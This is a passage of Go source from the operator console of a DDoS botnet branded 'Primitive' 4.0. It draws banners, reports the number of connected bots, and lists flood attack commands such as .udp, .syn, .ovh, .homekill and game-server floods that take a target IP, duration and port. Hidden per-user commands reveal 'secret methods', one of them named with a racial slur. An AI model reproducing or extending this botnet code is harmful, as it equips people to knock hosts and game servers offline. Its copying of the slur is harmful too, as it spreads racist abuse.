	this.conn.Write([]byte("\x1b[1;35m                ▐█ ▄█▀▄ █\x1b[1;36m·\x1b[1;35m██\x1b[1;36m ·\x1b[1;35m██ ▐███\x1b[1;36m▪\x1b[1;35m██\x1b[1;36m •\x1b[1;35m██  ██ \x1b[1;36m▪\x1b[1;35m█\x1b[1;36m·\x1b[1;35m█▌▀▄\x1b[1;36m.\x1b[1;35m▀\x1b[1;36m·\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                 ██▀\x1b[1;36m·\x1b[1;35m▐▀▀▄ ▐█\x1b[1;36m·\x1b[1;35m▐█ ▌▐▌▐█\x1b[1;36m·\x1b[1;35m▐█\x1b[1;36m· \x1b[1;35m▐█\x1b[1;36m.▪\x1b[1;35m▐█\x1b[1;36m·\x1b[1;35m▐█▐█\x1b[1;36m•\x1b[1;35m▐▀▀▪▄\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                ▐█\x1b[1;36m▪· \x1b[1;35m▐█\x1b[1;36m•\x1b[1;35m█▌▐█▌██ ██▌▐█▌▐█▌ ▐█▌\x1b[1;36m·\x1b[1;35m▐█▌ ███ ▐█▄▄▌\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                .\x1b[1;35m▀   \x1b[1;36m.\x1b[1;35m▀  ▀▀▀▀▀▀\x1b[1;36m· \x1b[1;35m█\x1b[1;36m▪\x1b[1;35m▀▀▀▀▀▀ ▀▀▀ ▀▀▀\x1b[1;36m. \x1b[1;35m▀   ▀▀▀ \r\n"))
	this.conn.Write([]byte("\x1b[1;36m                •        •   ·      ▪ ·     ▪      ·   Version: "+ v +"    \r\n"))
    this.conn.Write([]byte("\033[1;35m    ╔════════╦══════════════════════════╗\033[1;36m╔═════════╦═════════════════════╗\r\n"))
    this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mmethods\033[1;35m║\033[1;37mShows attack methods.     \033[1;35m║\033[1;36m║\033[1;37mlogout   \033[1;36m║\033[1;37mLogout of terminal   \033[1;36m║\r\n"))
    this.conn.Write([]byte("\033[1;35m    ║ \033[1;37msupport\033[1;35m║\033[1;37mSupport chat room.        \033[1;35m║\033[1;36m║\033[1;37mcredits  \033[1;36m║\033[1;37mCredits of Primitive \033[1;36m║\r\n"))
    this.conn.Write([]byte("\033[1;35m    ║ \033[1;37madmin  \033[1;35m║\033[1;37mShows admin commands      \033[1;35m║\033[1;36m║\033[1;37mplans    \033[1;36m║\033[1;37mPlans of Primitive   \033[1;36m║\r\n"))
    this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mtools  \033[1;35m║\033[1;37mCool tools                \033[1;35m║\033[1;36m║\033[1;37mapi-flood\033[1;36m║\033[1;37mAPI Flood and methods\033[1;36m║\r\n"))
    this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mbanners\033[1;35m║\033[1;37mShows Avalible banners.   \033[1;35m║\033[1;36m║\033[1;37mcls      \033[1;36m║\033[1;37mClears terminal      \033[1;36m║\r\n"))
    this.conn.Write([]byte("\033[1;35m    ╚════════╩══════════════════════════╝\033[1;36m╚═════════╩═════════════════════╝\r\n"))
	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\x1b[1;36m                                ╔═║\x1b[0m\x1b[1;35m@\x1b[0mPrimitive\x1b[1;36m║\r\n"))
		this.conn.Write([]byte("\x1b[1;36m                                ╚════\x1b[1;35m➢\x1b[0m "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "no" || cmd == "LOGOUT" || cmd == "logout" {
			return
		}
		if cmd == "" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			v := "4.0"
			botCount = clientList.Count()
			this.conn.Write([]byte("\x1b[1;35m                 ▄▄▄·▄▄▄  \x1b[1;36m▪  • \x1b[1;35m▌ ▄ \x1b[1;36m·. ▪ \x1b[1;35m ▄▄▄▄▄\x1b[1;36m▪\x1b[1;35m   ▌ ▐\x1b[1;36m·\x1b[1;35m▄▄▄ \x1b[1;36m.\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█ ▄█▀▄ █\x1b[1;36m·\x1b[1;35m██\x1b[1;36m ·\x1b[1;35m██ ▐███\x1b[1;36m▪\x1b[1;35m██\x1b[1;36m •\x1b[1;35m██  ██ \x1b[1;36m▪\x1b[1;35m█\x1b[1;36m·\x1b[1;35m█▌▀▄\x1b[1;36m.\x1b[1;35m▀\x1b[1;36m·\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                 ██▀\x1b[1;36m·\x1b[1;35m▐▀▀▄ ▐█\x1b[1;36m·\x1b[1;35m▐█ ▌▐▌▐█\x1b[1;36m·\x1b[1;35m▐█\x1b[1;36m· \x1b[1;35m▐█\x1b[1;36m.▪\x1b[1;35m▐█\x1b[1;36m·\x1b[1;35m▐█▐█\x1b[1;36m•\x1b[1;35m▐▀▀▪▄\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█\x1b[1;36m▪· \x1b[1;35m▐█\x1b[1;36m•\x1b[1;35m█▌▐█▌██ ██▌▐█▌▐█▌ ▐█▌\x1b[1;36m·\x1b[1;35m▐█▌ ███ ▐█▄▄▌\r\n"))
			this.conn.Write([]byte("\x1b[1;36m                .\x1b[1;35m▀   \x1b[1;36m.\x1b[1;35m▀  ▀▀▀▀▀▀\x1b[1;36m· \x1b[1;35m█\x1b[1;36m▪\x1b[1;35m▀▀▀▀▀▀ ▀▀▀ ▀▀▀\x1b[1;36m. \x1b[1;35m▀   ▀▀▀ \r\n"))
			this.conn.Write([]byte("\x1b[1;36m                •        •   ·      ▪ ·     ▪      ·   Version: "+ v +"    \r\n"))
            this.conn.Write([]byte("\033[1;35m    ╔════════╦══════════════════════════╗\033[1;36m╔═════════╦═════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mmethods\033[1;35m║\033[1;37mShows attack methods.     \033[1;35m║\033[1;36m║\033[1;37mlogout   \033[1;36m║\033[1;37mLogout of terminal   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37msupport\033[1;35m║\033[1;37mSupport chat room.        \033[1;35m║\033[1;36m║\033[1;37mcredits  \033[1;36m║\033[1;37mCredits of Primitive \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37madmin  \033[1;35m║\033[1;37mShows admin commands      \033[1;35m║\033[1;36m║\033[1;37mplans    \033[1;36m║\033[1;37mPlans of Primitive   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mtools  \033[1;35m║\033[1;37mCool tools                \033[1;35m║\033[1;36m║\033[1;37mapi-flood\033[1;36m║\033[1;37mAPI Flood and methods\033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mbanners\033[1;35m║\033[1;37mShows Avalible banners.   \033[1;35m║\033[1;36m║\033[1;37mcls      \033[1;36m║\033[1;37mClears terminal      \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ╚════════╩══════════════════════════╝\033[1;36m╚═════════╩═════════════════════╝\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[36m                  bot count \033[35m[ %d ]        \033[0m \r\n", botCount)))
			continue
		}
		if err != nil || cmd == "CLEAR" || cmd == "clear" || cmd == "cls" || cmd == "CLS" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
    		this.conn.Write([]byte("\033[2J\033[1;1H"))
			v := "4.0"
			botCount = clientList.Count()
			this.conn.Write([]byte("\x1b[1;35m                 ▄▄▄·▄▄▄  \x1b[1;36m▪  • \x1b[1;35m▌ ▄ \x1b[1;36m·. ▪ \x1b[1;35m ▄▄▄▄▄\x1b[1;36m▪\x1b[1;35m   ▌ ▐\x1b[1;36m·\x1b[1;35m▄▄▄ \x1b[1;36m.\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█ ▄█▀▄ █\x1b[1;36m·\x1b[1;35m██\x1b[1;36m ·\x1b[1;35m██ ▐███\x1b[1;36m▪\x1b[1;35m██\x1b[1;36m •\x1b[1;35m██  ██ \x1b[1;36m▪\x1b[1;35m█\x1b[1;36m·\x1b[1;35m█▌▀▄\x1b[1;36m.\x1b[1;35m▀\x1b[1;36m·\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                 ██▀\x1b[1;36m·\x1b[1;35m▐▀▀▄ ▐█\x1b[1;36m·\x1b[1;35m▐█ ▌▐▌▐█\x1b[1;36m·\x1b[1;35m▐█\x1b[1;36m· \x1b[1;35m▐█\x1b[1;36m.▪\x1b[1;35m▐█\x1b[1;36m·\x1b[1;35m▐█▐█\x1b[1;36m•\x1b[1;35m▐▀▀▪▄\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█\x1b[1;36m▪· \x1b[1;35m▐█\x1b[1;36m•\x1b[1;35m█▌▐█▌██ ██▌▐█▌▐█▌ ▐█▌\x1b[1;36m·\x1b[1;35m▐█▌ ███ ▐█▄▄▌\r\n"))
			this.conn.Write([]byte("\x1b[1;36m                .\x1b[1;35m▀   \x1b[1;36m.\x1b[1;35m▀  ▀▀▀▀▀▀\x1b[1;36m· \x1b[1;35m█\x1b[1;36m▪\x1b[1;35m▀▀▀▀▀▀ ▀▀▀ ▀▀▀\x1b[1;36m. \x1b[1;35m▀   ▀▀▀ \r\n"))
			this.conn.Write([]byte("\x1b[1;36m                •        •   ·      ▪ ·     ▪      ·   Version: "+ v +"    \r\n"))
            this.conn.Write([]byte("\033[1;35m    ╔════════╦══════════════════════════╗\033[1;36m╔═════════╦═════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mmethods\033[1;35m║\033[1;37mShows attack methods.     \033[1;35m║\033[1;36m║\033[1;37mlogout   \033[1;36m║\033[1;37mLogout of terminal   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37msupport\033[1;35m║\033[1;37mSupport chat room.        \033[1;35m║\033[1;36m║\033[1;37mcredits  \033[1;36m║\033[1;37mCredits of Primitive \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37madmin  \033[1;35m║\033[1;37mShows admin commands      \033[1;35m║\033[1;36m║\033[1;37mplans    \033[1;36m║\033[1;37mPlans of Primitive   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mtools  \033[1;35m║\033[1;37mCool tools                \033[1;35m║\033[1;36m║\033[1;37mapi-flood\033[1;36m║\033[1;37mAPI Flood and methods\033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mbanners\033[1;35m║\033[1;37mShows Avalible banners.   \033[1;35m║\033[1;36m║\033[1;37mcls      \033[1;36m║\033[1;37mClears terminal      \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ╚════════╩══════════════════════════╝\033[1;36m╚═════════╩═════════════════════╝\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[36m                  bot count \033[35m[ %d ]        \033[0m \r\n", botCount)))
			continue
		}
		if err != nil || cmd == "nobanner" || cmd == "NOBANNER" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			continue
		}
		if err != nil || cmd == "help" || cmd == "HELP" || cmd == "?" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			v := "4.0"
			botCount = clientList.Count()
			this.conn.Write([]byte("\x1b[1;35m                 ▄▄▄·▄▄▄  \x1b[1;36m▪  • \x1b[1;35m▌ ▄ \x1b[1;36m·. ▪ \x1b[1;35m ▄▄▄▄▄\x1b[1;36m▪\x1b[1;35m   ▌ ▐\x1b[1;36m·\x1b[1;35m▄▄▄ \x1b[1;36m.\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█ ▄█▀▄ █\x1b[1;36m·\x1b[1;35m██\x1b[1;36m ·\x1b[1;35m██ ▐███\x1b[1;36m▪\x1b[1;35m██\x1b[1;36m •\x1b[1;35m██  ██ \x1b[1;36m▪\x1b[1;35m█\x1b[1;36m·\x1b[1;35m█▌▀▄\x1b[1;36m.\x1b[1;35m▀\x1b[1;36m·\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                 ██▀\x1b[1;36m·\x1b[1;35m▐▀▀▄ ▐█\x1b[1;36m·\x1b[1;35m▐█ ▌▐▌▐█\x1b[1;36m·\x1b[1;35m▐█\x1b[1;36m· \x1b[1;35m▐█\x1b[1;36m.▪\x1b[1;35m▐█\x1b[1;36m·\x1b[1;35m▐█▐█\x1b[1;36m•\x1b[1;35m▐▀▀▪▄\r\n"))
			this.conn.Write([]byte("\x1b[1;35m                ▐█\x1b[1;36m▪· \x1b[1;35m▐█\x1b[1;36m•\x1b[1;35m█▌▐█▌██ ██▌▐█▌▐█▌ ▐█▌\x1b[1;36m·\x1b[1;35m▐█▌ ███ ▐█▄▄▌\r\n"))
			this.conn.Write([]byte("\x1b[1;36m                .\x1b[1;35m▀   \x1b[1;36m.\x1b[1;35m▀  ▀▀▀▀▀▀\x1b[1;36m· \x1b[1;35m█\x1b[1;36m▪\x1b[1;35m▀▀▀▀▀▀ ▀▀▀ ▀▀▀\x1b[1;36m. \x1b[1;35m▀   ▀▀▀ \r\n"))
			this.conn.Write([]byte("\x1b[1;36m                •        •   ·      ▪ ·     ▪      ·   Version: "+ v +"    \r\n"))
            this.conn.Write([]byte("\033[1;35m    ╔════════╦══════════════════════════╗\033[1;36m╔═════════╦═════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mmethods\033[1;35m║\033[1;37mShows attack methods.     \033[1;35m║\033[1;36m║\033[1;37mlogout   \033[1;36m║\033[1;37mLogout of terminal   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37msupport\033[1;35m║\033[1;37mSupport chat room.        \033[1;35m║\033[1;36m║\033[1;37mcredits  \033[1;36m║\033[1;37mCredits of Primitive \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37madmin  \033[1;35m║\033[1;37mShows admin commands      \033[1;35m║\033[1;36m║\033[1;37mplans    \033[1;36m║\033[1;37mPlans of Primitive   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mtools  \033[1;35m║\033[1;37mCool tools                \033[1;35m║\033[1;36m║\033[1;37mapi-flood\033[1;36m║\033[1;37mAPI Flood and methods\033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ║ \033[1;37mbanners\033[1;35m║\033[1;37mShows Avalible banners.   \033[1;35m║\033[1;36m║\033[1;37mcls      \033[1;36m║\033[1;37mClears terminal      \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;35m    ╚════════╩══════════════════════════╝\033[1;36m╚═════════╩═════════════════════╝\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[36m                  bot count \033[35m[ %d ]        \033[0m \r\n", botCount)))
			continue
		}
		if err != nil || cmd == "methods" || cmd == "METHODS" {
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;35m╔═══════════════════════════════════╗\x1b[1;36m╔═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║     <PUBLIC ATTACK METHODS>       ║\x1b[1;36m║   <PRIVATE ATTACK METHODS>    ║\r\n"))//attack method header
            this.conn.Write([]byte("\033[1;35m║ .udp [ip] [time] dport=[port]     ║\x1b[1;36m║ .homekill [ip] [time]         ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .vse [ip] [time] dport=[port]     ║\x1b[1;36m║ .ovh2 [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ice [ip] [time] dport=[port]     ║\x1b[1;36m║ .http [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .syn [ip] [time] dport=[port]     ║\x1b[1;36m║ .rhex [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ack [ip] [time] dport=[port]     ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ovh [ip] [time] dport=[port]     ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .game [ip] [time] dport=[port]    ║\x1b[1;36m╔╩╩═════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .xmas [ip] [time] dport=[port]    ║\x1b[1;36m║     <GAME SERVER METHODS>     ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .frag [ip] [time] dport=[port]    ║\x1b[1;36m║ .fnl [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stomp [ip] [time] dport=[port]   ║\x1b[1;36m║ .game [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greip [ip] [time] dport=[port]   ║\x1b[1;36m║ .r6 [ip] [time] dport=[port]  ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stdhex [ip] [time] dport=[port]  ║\x1b[1;36m║ .cod [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udphex [ip] [time] dport=[port]  ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greeth [ip] [time] dport=[port]  ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .killall [ip] [time] dport=[port] ╠\x1b[1;36m═╝║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udpplain [ip] [time] dport=[port]╠\x1b[1;36m══╝\r\n"))
            this.conn.Write([]byte("\033[1;35m╚═══════════════════════════════════╝   \r\n"))
            continue
        }
        if cmd == "PAPA" && username == "gme" {
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;35m╔═══════════════════════════════════╗\x1b[1;36m╔═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║     <PUBLIC ATTACK METHODS>       ║\x1b[1;36m║   <PRIVATE ATTACK METHODS>    ║\r\n"))//attack method header
            this.conn.Write([]byte("\033[1;35m║ .udp [ip] [time] dport=[port]     ║\x1b[1;36m║ .homekill [ip] [time]         ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .vse [ip] [time] dport=[port]     ║\x1b[1;36m║ .ovh2 [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ice [ip] [time] dport=[port]     ║\x1b[1;36m║ .http [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .syn [ip] [time] dport=[port]     ║\x1b[1;36m║ .rhex [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ack [ip] [time] dport=[port]     ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ovh [ip] [time] dport=[port]     ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .game [ip] [time] dport=[port]    ║\x1b[1;36m╔╩╩═════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .xmas [ip] [time] dport=[port]    ║\x1b[1;36m║     <GAME SERVER METHODS>     ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .frag [ip] [time] dport=[port]    ║\x1b[1;36m║ .fnl [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stomp [ip] [time] dport=[port]   ║\x1b[1;36m║ .game [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greip [ip] [time] dport=[port]   ║\x1b[1;36m║ .r6 [ip] [time] dport=[port]  ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stdhex [ip] [time] dport=[port]  ║\x1b[1;36m║ .cod [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udphex [ip] [time] dport=[port]  ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greeth [ip] [time] dport=[port]  ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .killall [ip] [time] dport=[port] ╠\x1b[1;36m═╝║Secret method for daddy gme:\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udpplain [ip] [time] dport=[port]╠\x1b[1;36m══╝ .gme-killall\r\n"))
            this.conn.Write([]byte("\033[1;35m╚═══════════════════════════════════╝   \r\n"))
            continue
        }
        if cmd == "AWEE" && username == "jack" {
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[1;35m╔═══════════════════════════════════╗\x1b[1;36m╔═══════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║     <PUBLIC ATTACK METHODS>       ║\x1b[1;36m║   <PRIVATE ATTACK METHODS>    ║\r\n"))//attack method header
            this.conn.Write([]byte("\033[1;35m║ .udp [ip] [time] dport=[port]     ║\x1b[1;36m║ .homekill [ip] [time]         ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .vse [ip] [time] dport=[port]     ║\x1b[1;36m║ .ovh2 [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ice [ip] [time] dport=[port]     ║\x1b[1;36m║ .http [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .syn [ip] [time] dport=[port]     ║\x1b[1;36m║ .rhex [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ack [ip] [time] dport=[port]     ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .ovh [ip] [time] dport=[port]     ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .game [ip] [time] dport=[port]    ║\x1b[1;36m╔╩╩═════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .xmas [ip] [time] dport=[port]    ║\x1b[1;36m║     <GAME SERVER METHODS>     ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .frag [ip] [time] dport=[port]    ║\x1b[1;36m║ .fnl [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stomp [ip] [time] dport=[port]   ║\x1b[1;36m║ .game [ip] [time] dport=[port]║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greip [ip] [time] dport=[port]   ║\x1b[1;36m║ .r6 [ip] [time] dport=[port]  ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .stdhex [ip] [time] dport=[port]  ║\x1b[1;36m║ .cod [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udphex [ip] [time] dport=[port]  ║\x1b[1;36m║ .kcs [ip] [time] dport=[port] ║\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .greeth [ip] [time] dport=[port]  ║\x1b[1;36m╚╦╦═════════════════════════════╝\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .killall [ip] [time] dport=[port] ╠\x1b[1;36m═╝║Secret method jack:\r\n"))
            this.conn.Write([]byte("\033[1;35m║ .udpplain [ip] [time] dport=[port]╠\x1b[1;36m══╝ .jck-nigger\r\n"))
            this.conn.Write([]byte("\033[1;35m╚═══════════════════════════════════╝\r\n"))
            continue
        }
		if err != nil || cmd == "TOOLS" || cmd == "tools" {
			this.conn.Write([]byte("\x1b[1;37mping\r\n"))
			this.conn.Write([]byte("\x1b[1;37miplookup\r\n"))
			continue
		}
		if cmd == "banners" {
			this.conn.Write([]byte("batman | more coming soon\r\n"))
			this.conn.Write([]byte("bang   | more coming soon\r\n"))
			continue
		}
		if err != nil || cmd == "BANG" || cmd == "bang" {
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
    
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
